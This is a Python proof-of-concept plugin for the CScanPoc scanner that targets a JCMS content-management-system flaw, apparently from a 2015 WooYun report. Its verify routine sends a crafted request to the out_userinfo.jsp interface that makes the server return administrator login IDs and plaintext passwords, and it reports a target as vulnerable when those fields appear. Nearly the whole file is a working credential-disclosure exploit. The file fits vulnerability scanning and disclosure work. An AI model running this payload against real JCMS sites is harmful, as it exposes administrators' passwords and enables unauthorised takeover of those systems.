# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'JCMS_0008' # 平台漏洞编号，留空
    name = 'JCMS 设计缺陷直接爆管理员明文密码' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        JCMS涉及缺陷，爆管理员明文密码。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=095221' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'JCMS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ead62dac-36a2-426b-ab88-2a6079563a15'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/jcms/interface/user/out_userinfo.jsp?xmlinfo=%3Cmain%3E%3Cstatus%3EQ%3C/status%3E%3C/main%3E"
            url = '{target}'.format(target=self.target)+payload
            code, head,res, errcode, _ = hh.http(url)
                       
            if code == 200 and 'loginid' in res and 'password' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()